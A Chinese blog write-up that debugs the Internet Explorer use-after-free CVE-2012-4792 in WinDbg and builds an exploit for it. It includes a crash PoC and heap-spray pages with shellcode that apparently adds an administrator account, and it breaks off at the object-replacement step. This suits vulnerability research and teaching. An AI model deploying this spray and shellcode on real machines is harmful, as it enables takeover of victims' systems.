---
title: 漏洞分析之CVE-2012-4792(UAF)
tags: [漏洞调试]
date: 2017-06-29 01:04
---
0x00 漏洞简介  2012年9月，通用漏洞与披露平台发布了一个存在IE浏览器的UAF漏洞。   报告指出：Microsoft Internet Explorer 6至9版本中的mshtml.dll中的CMshtmlEd::Exec函数中存在释放后使用漏洞。远程攻击者可利用该漏洞通过特制的网站，执行任意代码。 0x01 测试环境操作系统：Windows XP sp3浏览器：IE 8.00.6
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><h1 id="0x00-漏洞简介">0x00 漏洞简介</h1>
<blockquote>
<p>2012年9月，通用漏洞与披露平台发布了一个存在IE浏览器的UAF漏洞。 <br>
  报告指出：Microsoft Internet Explorer 6至9版本中的mshtml.dll中的CMshtmlEd::Exec函数中存在释放后使用漏洞。远程攻击者可利用该漏洞通过特制的网站，执行任意代码。 </br></p>
</blockquote>
<h1 id="0x01-测试环境">0x01 测试环境</h1>
<p>操作系统：Windows XP sp3</p>
<p>浏览器：IE 8.00.6001.18702</p>
<p>漏洞文件：mshtml 8.00.6001.18702</p>
<p>调试器：windbg  x86</p>
<p>利用windbg辅助工具设置系统堆栈调试功能</p>
<pre class="prettyprint"><code class=" hljs avrasm"><span class="hljs-label">C:</span>\Documents <span class="hljs-keyword">and</span> Settings\Administrator&gt;gflags<span class="hljs-preprocessor">.exe</span> -I iexplore<span class="hljs-preprocessor">.exe</span> +hpa +ust
Current Registry Settings for iexplore<span class="hljs-preprocessor">.exe</span> executable are: <span class="hljs-number">02001000</span>
    ust - Create user mode stack trace database
    hpa - Enable page heap</code></pre>
<h1 id="0x02-漏洞验证">0x02 漏洞验证</h1>
<p>首先给出一段简单的poc验证CVE漏洞</p>
<pre class="prettyprint"><code class=" hljs xml"><span class="hljs-doctype">&lt;!doctype html&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">script</span>&gt;</span><span class="javascript"> 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exploit</span><span class="hljs-params">()</span>
{</span>
     <span class="hljs-keyword">var</span> e0 = <span class="hljs-literal">null</span>;
     <span class="hljs-keyword">var</span> e1 = <span class="hljs-literal">null</span>;
     <span class="hljs-keyword">var</span> e2 = <span class="hljs-literal">null</span>; 
     <span class="hljs-keyword">try</span> {
          e0 = document.getElementById(<span class="hljs-string">"a"</span>);
          e1 = document.createElement(<span class="hljs-string">"div"</span>);
          e2 = document.createElement(<span class="hljs-string">"q"</span>);
          e1.applyElement(e2);
          e1.appendChild(document.createElement(<span class="hljs-string">'button'</span>));
          e1.applyElement(e0);
          e2.innerHTML = <span class="hljs-string">""</span>;
          e2.appendChild(document.createElement(<span class="hljs-string">'body'</span>));
     } <span class="hljs-keyword">catch</span>(e) { }
     CollectGarbage(); 
} 
</span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span> 
<span class="hljs-tag">&lt;/<span class="hljs-title">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">body</span> <span class="hljs-attribute">onload</span>=<span class="hljs-value">"exploit()"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">form</span> <span class="hljs-attribute">id</span>=<span class="hljs-value">"a"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-title">form</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-title">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-title">html</span>&gt;</span></code></pre>
<p>利用windbg attach IE 后 输入g继续运行运行，点击运行阻止的内容 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170628215513047?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170628215336125?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></img></br></p>
<p>观察windbg中代码停止的位置 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170628220802699?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
结果发现edi（目测是一个申请堆的地址）是无效地址，程序崩溃。 <br>
这里应该取对象的虚表时发现地址不可取 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170629082953874?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
下面会有调用虚表中的函数操作，那才是我们需要控制程序流的地方。</br></img></br></br></br></img></br></p>
<h1 id="0x03-漏洞原理">0x03 漏洞原理</h1>
<p>首先我们利用<code>!heap –p –a edi</code>查看堆的相关操作 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170628232513455?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></p>
<p>我们从中可以看到，edi已经是释放后的堆了，这里<code>mov eax,dword ptr[edi]</code> <br>
又对释放后的堆，再次使用。</br></p>
<p>下面有几个关键的问题没有解决：</p>
<ol>
<li>什么时候创建的堆</li>
<li>什么时候释放的堆</li>
<li>什么时候使用的堆</li>
</ol>
<h2 id="0x1-堆的创建">0x1 堆的创建</h2>
<p>为了方便查找堆的创建，在windbg加载IE后查看所有关于CButton的函数 <br>
我们可以得到一些有用的信息</br></p>
<pre class="prettyprint"><code class=" hljs fsharp"><span class="hljs-number">0</span>:<span class="hljs-number">005</span>&gt; x mshtml!CButton::*
<span class="hljs-number">6</span>a28f234 mshtml!CButton::HandleMessage = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28ee18 mshtml!CButton::s_classdescTagButton = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28ed83 mshtml!CButton::GetAAtype = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28f862 mshtml!CButton::GetValueHelper = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28ef62 mshtml!CButton::GetEnabled = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28f36a mshtml!CButton::GetThemeState = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28f75d mshtml!CButton::get_status = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28ee41 mshtml!CButton::CreateElement = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;//很明显是一个按钮创建的过程</span>
<span class="hljs-number">6</span>a28f035 mshtml!CButton::Notify = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a0c4750 mshtml!CButton::s_StringTable = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28f1e0 mshtml!CButton::GetFocusShape = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28f8eb mshtml!CButton::SetStatusText = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28f70d mshtml!CButton::put_status = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28f128 mshtml!CButton::YieldCurrency = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a0b0d8c mshtml!CButton::GetBtnHelper = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28ef95 mshtml!CButton::GetBorderInfo = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28f2f0 mshtml!CButton::ClickAction = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a298d55 mshtml!CButton::createTextRange = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28f87d mshtml!CButton::SetValueHelper = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28eda5 mshtml!CButton::GetClassDesc = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28f3c2 mshtml!CButton::ApplyDefaultFormat = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28ef0d mshtml!CButton::GetSubmitInfo = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a029d70 mshtml!CButton::s_apfnpdIHTMLButtonElement = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a0ad720 mshtml!CButton::s_acpi = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a0b0338 mshtml!CButton::GetNonThemedBorderInfo = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28f10b mshtml!CButton::AddCtxInfoToStream = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a0c4740 mshtml!CButton::s_StringTableAggregate = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28f337 mshtml!CButton::GetThemeProperties = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28f7a3 mshtml!CButton::GetValue = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28edf4 mshtml!CButton::s_classdescButtonSubmit = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28eeb8 mshtml!CButton::Init2 = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a188ee4 mshtml!CButton::s_apHdlDescs = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a188f00 mshtml!CButton::s_ppropdescsInVtblOrderIHTMLButtonElement = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28ed27 mshtml!CButton::`scalar deleting destructor' = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;//猜测是按钮销毁的过程</span>
<span class="hljs-number">6</span>a0c4780 mshtml!CButton::s_AssocVTablePtr = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a0af828 mshtml!CButton::GetElement = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">69e765</span>f0 mshtml!CButton::`vftable' = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28edd0 mshtml!CButton::s_classdescButtonReset = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a034f04 mshtml!CButton::`vftable' = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28ed27 mshtml!CButton::`vector deleting destructor' = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28ed62 mshtml!CButton::SetAAtype = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">6</span>a28f9a6 mshtml!CButton::EnsureDefaultAttributes = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span>
<span class="hljs-number">69</span>fe3571 mshtml!CButton::GetDBindMethods = &lt;no <span class="hljs-class"><span class="hljs-keyword">type</span> <span class="hljs-title">information</span>&gt;</span></code></pre>
<p>在上面我们可以找到两个比较有用的函数</p>
<pre class="prettyprint"><code class=" hljs delphi"><span class="hljs-number">6</span>a28ee41 mshtml!CButton::CreateElement = &lt;no <span class="hljs-keyword">type</span> information&gt;<span class="hljs-comment">//很明显是一个按钮创建的过程</span>
<span class="hljs-number">6</span>a28ed27 mshtml!CButton::`scalar deleting <span class="hljs-function"><span class="hljs-keyword">destructor</span>' = &lt;<span class="hljs-title">no</span> <span class="hljs-title">type</span> <span class="hljs-title">information</span>&gt;//猜测是按钮销毁的过程</span></code></pre>
<p>我们对这两个地方下断点，直接利用地址进行断点设置</p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170628234314578?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<p>跟踪调试一下</p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170628234709488?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<p>我们发现了HeapAlloc函数 ，该函数位button按钮分配内存，查看一下分配的地址为0x70b2fa8 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170628235304136?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170629000848146?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
至此button的分配已经完成</br></img></p>
<h2 id="0x2-堆的释放">0x2 堆的释放</h2>
<p>刚刚我们把断点设在了mshtml!CButton::`scalar deleting destructor’  函数这 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170628235600855?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
在函数的中间我们发现了释放堆的代码，前三个压栈的是函数的参数，最后一个压栈的是要释放内存的地址0x70b2fa8 发现与申请的时候内存地址相吻合 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170628235714561?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></img></br></p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170629001001530?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
堆的释放就结束了。</br></img></p>
<h2 id="0x3-堆的重用">0x3 堆的重用</h2>
<p>就在刚一开始的时候，程序崩溃的地方，访问di内存地址无效，造成的程序崩溃，成为能够控制代码执行的地方 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170629001047663?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></p>
<h2 id="0x4-与js代码结合分析">0x4 与JS代码结合分析</h2>
<p>前面一部分我们只知道了，在程序执行时汇编代码所做的的操作，如果对应到JS代码上，应该怎么理解。 <br>
这里有几个猜想</br></p>
<ol>
<li>e1.appendChild(document.createElement(‘button’)); 执行了HeapAlloc函数</li>
<li>e2.outerText = “”; 把button对象释放了</li>
<li>e2.appendChild(document.createElement(‘body’)); 是的内存重用</li>
</ol>
<p>以上是对JS代码在堆上的操作进行的猜想。 <br>
下面修改一下验证代码，将上述payload改成如下所示</br></p>
<pre class="prettyprint"><code class=" hljs coffeescript">    e0 = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">"a"</span>);
    e1 = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">"div"</span>);
    e2 = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">"q"</span>);
    e1.applyElement(e2);
    e1.appendChild(<span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'button'</span>));
    alert(<span class="hljs-string">"init create"</span>);
    e1.applyElement(e0);
    e2.innerHTML = <span class="hljs-string">""</span>;
    alert(<span class="hljs-string">"delete？"</span>);
    e2.appendChild(<span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">'body'</span>));
    alert(<span class="hljs-string">"end"</span>);</code></pre>
<p>经过试验得出以下结论 <br>
 e1.appendChild(document.createElement(‘button’)); 为内存初始申请 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170629002326305?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
堆的释放和再次使用在<code>e2.innerHTML = "";</code>之后 和 <code>e2.appendChild(document.createElement('body'));</code>之后</br></img></br></br></p>
<h1 id="0x04-利用代码编写">0x04 利用代码编写</h1>
<p>我们回到之前的程序崩溃的地方，edi中的值无效，所以取堆的dword的时候是没有值的。借着在虚表中查找函数地址，在虚表偏移0xDC的地方存在函数跳转的地址。整个正向的函数执行过程很清楚，具体是我们怎么使用这些条件。利用方法如下：</p>
<ol>
<li>在堆中喷满shellcode代码</li>
<li>替换CButton对象的dword值，到自己指定函数虚表中查找（可以是0x0c0c0c0c or 0x1c1c1c1c）</li>
<li><p>在虚表的0xDC偏移处，填写指定的shellcode地址</p>
<p>最后直接执行就是了</p></li>
</ol>
<p>这里利用了一个关键技术，堆喷射技术，该技术是一种payload传递技术，它充分利用了javascript的特性。</p>
<h2 id="0x1-堆喷射">0x1 堆喷射</h2>
<p>为了控制虚表以及偏移处函数地址，我们在不知道精确地址的情况下可以采用堆喷射技术。</p>
<h3 id="无dep保护的情况">无DEP保护的情况</h3>
<pre class="prettyprint"><code class=" hljs dos">&lt;html&gt;
&lt;head&gt;&lt;/head&gt;
&lt;body&gt;
&lt;script&gt;
//堆喷射
 //Fix BSTR spec
 function alloc(bytes, mystr) {
 while (mystr.length&lt;bytes) mystr += mystr;
 return mystr.substr(<span class="hljs-number">0</span>, (bytes-<span class="hljs-number">6</span>)/<span class="hljs-number">2</span>);
 }

 block_size = <span class="hljs-number">0</span>x1000;
 Padding = '';
 NopSlide = '';

 var Shellcode =
unescape('<span class="hljs-envvar">%ud231%</span>u30b2<span class="hljs-envvar">%u8b64%</span>u8b12<span class="hljs-envvar">%u0c52%</span>u528b<span class="hljs-envvar">%u8b1c%</span>u0842<span class="hljs-envvar">%u728b%</span>u8b20<span class="hljs-envvar">%u8012%</span>u0c7e<span class="hljs-envvar">%u7533%</span>u89f2<span class="hljs-envvar">%u03c7%</span>u3c78<span class="hljs-envvar">%u578b%</span>u0178<span class="hljs-envvar">%u8bc2%</span>u207a<span class="hljs-envvar">%uc701%</span>ued31<span class="hljs-envvar">%u348b%</span>u01af<span class="hljs-envvar">%u45c6%</span>u3e81<span class="hljs-envvar">%u6957%</span>u456e<span class="hljs-envvar">%uf275%</span>u7a8b<span class="hljs-envvar">%u0124%</span>u66c7<span class="hljs-envvar">%u2c8b%</span>u8b6f<span class="hljs-envvar">%u1c7a%</span>uc701<span class="hljs-envvar">%u7c8b%</span>ufcaf<span class="hljs-envvar">%uc701%</span>u4b68<span class="hljs-envvar">%u6e33%</span>u6801<span class="hljs-envvar">%u4220%</span>u6f72<span class="hljs-envvar">%u2f68%</span>u4441<span class="hljs-envvar">%u6844%</span>u726f<span class="hljs-envvar">%u2073%</span>u7468<span class="hljs-envvar">%u6172%</span>u6874<span class="hljs-envvar">%u6e69%</span>u7369<span class="hljs-envvar">%u2068%</span>u6441<span class="hljs-envvar">%u686d%</span>u6f72<span class="hljs-envvar">%u7075%</span>u6368<span class="hljs-envvar">%u6c61%</span>u6867<span class="hljs-envvar">%u2074%</span>u6f6c<span class="hljs-envvar">%u2668%</span>u6e20<span class="hljs-envvar">%u6865%</span>u4444<span class="hljs-envvar">%u2620%</span>u6e68<span class="hljs-envvar">%u2f20%</span>u6841<span class="hljs-envvar">%u6f72%</span>u334b<span class="hljs-envvar">%u3368%</span>u206e<span class="hljs-envvar">%u6842%</span>u7242<span class="hljs-envvar">%u4b6f%</span>u7368<span class="hljs-envvar">%u7265%</span>u6820<span class="hljs-envvar">%u7465%</span>u7520<span class="hljs-envvar">%u2f68%</span>u2063<span class="hljs-envvar">%u686e%</span>u7865<span class="hljs-envvar">%u2065%</span>u6368<span class="hljs-envvar">%u646d%</span>u892e<span class="hljs-envvar">%ufee5%</span>u534d<span class="hljs-envvar">%uc031%</span>u5550%ud7ff');


 <span class="hljs-flow">for</span> (c = <span class="hljs-number">0</span>; c &lt; block_size; c++){
 NopSlide += unescape('%u1c1c');} //shellcode hou
 NopSlide = NopSlide.substring(<span class="hljs-number">0</span>,block_size - (Shellcode.length));

 var OBJECT = Shellcode + NopSlide;
 OBJECT = alloc(<span class="hljs-number">0</span>xfffe0, OBJECT); // <span class="hljs-number">0</span>xfffe0 = <span class="hljs-number">1</span>mb

 var evil = new Array();
 <span class="hljs-flow">for</span> (var k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">0</span>x350; k++) {
 evil[k] = OBJECT.substr(<span class="hljs-number">0</span>, OBJECT.length);
 }
 alert('spray done !');
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>这一步只是将堆上喷满slip代码和shellcode。因为没有DEP所以不需要那么精准</p>
<h3 id="dep保护情况">DEP保护情况</h3>
<p>先贴上精准喷射代码</p>
<pre class="prettyprint"><code class=" hljs dos">&lt;html&gt;
&lt;head&gt;&lt;/head&gt;
&lt;body&gt;
&lt;script&gt;
//堆喷射
 //Fix BSTR spec
 function alloc(bytes, mystr) {
 while (mystr.length&lt;bytes) mystr += mystr;
 return mystr.substr(<span class="hljs-number">0</span>, (bytes-<span class="hljs-number">6</span>)/<span class="hljs-number">2</span>);
 }

 block_size = <span class="hljs-number">0</span>x1000;
 padding_size = <span class="hljs-number">0</span>xdFe; //这里必须根据自己的电脑来配置 为了对齐
 Padding = '';
 NopSlide = '';

 var Shellcode =
unescape('<span class="hljs-envvar">%ud231%</span>u30b2<span class="hljs-envvar">%u8b64%</span>u8b12<span class="hljs-envvar">%u0c52%</span>u528b<span class="hljs-envvar">%u8b1c%</span>u0842<span class="hljs-envvar">%u728b%</span>u8b20<span class="hljs-envvar">%u8012%</span>u0c7e<span class="hljs-envvar">%u7533%</span>u89f2<span class="hljs-envvar">%u03c7%</span>u3c78<span class="hljs-envvar">%u578b%</span>u0178<span class="hljs-envvar">%u8bc2%</span>u207a<span class="hljs-envvar">%uc701%</span>ued31<span class="hljs-envvar">%u348b%</span>u01af<span class="hljs-envvar">%u45c6%</span>u3e81<span class="hljs-envvar">%u6957%</span>u456e<span class="hljs-envvar">%uf275%</span>u7a8b<span class="hljs-envvar">%u0124%</span>u66c7<span class="hljs-envvar">%u2c8b%</span>u8b6f<span class="hljs-envvar">%u1c7a%</span>uc701<span class="hljs-envvar">%u7c8b%</span>ufcaf<span class="hljs-envvar">%uc701%</span>u4b68<span class="hljs-envvar">%u6e33%</span>u6801<span class="hljs-envvar">%u4220%</span>u6f72<span class="hljs-envvar">%u2f68%</span>u4441<span class="hljs-envvar">%u6844%</span>u726f<span class="hljs-envvar">%u2073%</span>u7468<span class="hljs-envvar">%u6172%</span>u6874<span class="hljs-envvar">%u6e69%</span>u7369<span class="hljs-envvar">%u2068%</span>u6441<span class="hljs-envvar">%u686d%</span>u6f72<span class="hljs-envvar">%u7075%</span>u6368<span class="hljs-envvar">%u6c61%</span>u6867<span class="hljs-envvar">%u2074%</span>u6f6c<span class="hljs-envvar">%u2668%</span>u6e20<span class="hljs-envvar">%u6865%</span>u4444<span class="hljs-envvar">%u2620%</span>u6e68<span class="hljs-envvar">%u2f20%</span>u6841<span class="hljs-envvar">%u6f72%</span>u334b<span class="hljs-envvar">%u3368%</span>u206e<span class="hljs-envvar">%u6842%</span>u7242<span class="hljs-envvar">%u4b6f%</span>u7368<span class="hljs-envvar">%u7265%</span>u6820<span class="hljs-envvar">%u7465%</span>u7520<span class="hljs-envvar">%u2f68%</span>u2063<span class="hljs-envvar">%u686e%</span>u7865<span class="hljs-envvar">%u2065%</span>u6368<span class="hljs-envvar">%u646d%</span>u892e<span class="hljs-envvar">%ufee5%</span>u534d<span class="hljs-envvar">%uc031%</span>u5550%ud7ff');

 <span class="hljs-flow">for</span> (p = <span class="hljs-number">0</span>; p &lt; padding_size; p++){
 Padding += unescape('%u1c1c');}

 <span class="hljs-flow">for</span> (c = <span class="hljs-number">0</span>; c &lt; block_size; c++){
 NopSlide += unescape('%u1c1c');} //jmp
 NopSlide = NopSlide.substring(<span class="hljs-number">0</span>,block_size - (Shellcode.length + Padding.length));

 var OBJECT = Padding + Shellcode + NopSlide;
 OBJECT = alloc(<span class="hljs-number">0</span>xfffe0, OBJECT); // <span class="hljs-number">0</span>xfffe0 = <span class="hljs-number">1</span>mb

 var evil = new Array();
 <span class="hljs-flow">for</span> (var k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">0</span>x350; k++) {
 evil[k] = OBJECT.substr(<span class="hljs-number">0</span>, OBJECT.length);
 }
 alert('spray done !');
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>因为我们需要构造rop链所以，需要知道准确的跳转地址，这里我们需要一定的尝试与计算 <br>
首先我们不设置padding_size的大小 <br>
及 <br>
<code>padding_size = 0x00; //offset to 0x0c0c0c0c inside our 0x1000 hex block</code></br></br></br></p>
<p>我们观察一下0x1c1c1c1c所处的第一个堆块的位置0x1c0e0020</p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170629103133507?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
0x1c1c1c1c距离0x1c0e0020<code>0x1c1c1c1c-0x1c0e0020=0xe1bfc</code> <br>
因为每一个payload的大小是0x2000，这里引用别人的一张图，表述一下现在内存的情况 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170629105137955?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></br></img></p>
<p>所以这里<code>0xe1bfc%0x2000 = 0x1bfc</code> <br>
又因为unescape使得两个字节成为了一个字节，所以这里在填充的时候除2 <br>
<code>padding_size = 0xdFe</code> <br>
我们看一下效果，发现成功定位，下一步工作就是替换虚表地址 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170629105252731?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></br></br></p>
<h2 id="0x2-对象占位">0x2 对象占位</h2>
